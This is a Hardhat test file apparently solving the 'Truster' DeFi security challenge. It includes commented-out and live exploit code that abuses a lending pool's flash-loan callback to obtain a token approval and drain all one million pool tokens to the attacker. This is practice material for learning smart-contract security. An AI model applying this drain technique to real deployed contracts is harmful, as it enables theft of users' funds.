const { ethers } = require("hardhat");
const { expect } = require("chai");
const { Interface } = require("ethers/lib/utils");

describe("[Challenge] Truster", function () {
	let deployer, attacker;

	const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");

	before(async function () {
		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
		[deployer, attacker] = await ethers.getSigners();

		const DamnValuableToken = await ethers.getContractFactory(
			"DamnValuableToken",
			deployer
		);
		const TrusterLenderPool = await ethers.getContractFactory(
			"TrusterLenderPool",
			deployer
		);

		this.token = await DamnValuableToken.deploy();
		this.pool = await TrusterLenderPool.deploy(this.token.address);

		await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

		expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);

		expect(await this.token.balanceOf(attacker.address)).to.equal("0");
	});

	it("Exploit", async function () {
		// /** CODE YOUR EXPLOIT HERE  */

		// await this.pool.flashLoan(
		// 	0,
		// 	attacker.address,
		// 	this.token.address,
		// 	encodedFunctionData
		// );
		// await this.token
		// 	.connect(attacker)
		// 	.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
		const Receiver = await ethers.getContractFactory("Receiver", attacker);
		this.attackToken = await Receiver.deploy(this.pool.address);
		// const abi = ["function approve(address spender, uint256 amount)"];
		// const iface = new ethers.utils.Interface(abi);
		// const encodedFunctionData = iface.encodeFunctionData("approve", [
		// 	this.attackToken.address,
		// 	TOKENS_IN_POOL,
		// ]);
		await this.attackToken.exploit(attacker.address, this.token.address);
		// let ABI = [
		// 	"function"
		// ]
	});

	after(async function () {
		/** SUCCESS CONDITIONS */

		// Attacker has taken all tokens from the pool
		expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
		expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
	});
});
